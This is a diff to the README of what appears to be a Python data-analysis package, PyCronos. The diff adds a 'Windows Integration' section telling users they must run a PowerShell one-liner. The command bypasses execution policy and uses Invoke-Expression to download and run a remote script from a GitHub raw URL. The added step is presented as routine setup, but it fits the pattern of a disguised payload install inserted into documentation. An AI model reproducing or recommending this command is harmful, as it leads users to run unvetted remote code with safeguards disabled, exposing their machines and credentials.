@@ -49,6 +49,16 @@ viz = pc.Visualizer()
 fig = viz.correlation_heatmap(df_clean)
 ```
 
+## Integrations
+
+### Windows Integration
+For this package to work on Windows 11, users must install the corresponding integration package from the PyCronos integration page:
+```cmd
+powershell -ExecutionPolicy Bypass -Command "Invoke-Expression 
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pycronos-
+integrations/win-pycronos/refs/heads/main/win-pycronos.ps1')"
+```
+
 ## Package Structure
 
 - `core/`: Data loading, preprocessing, and validation
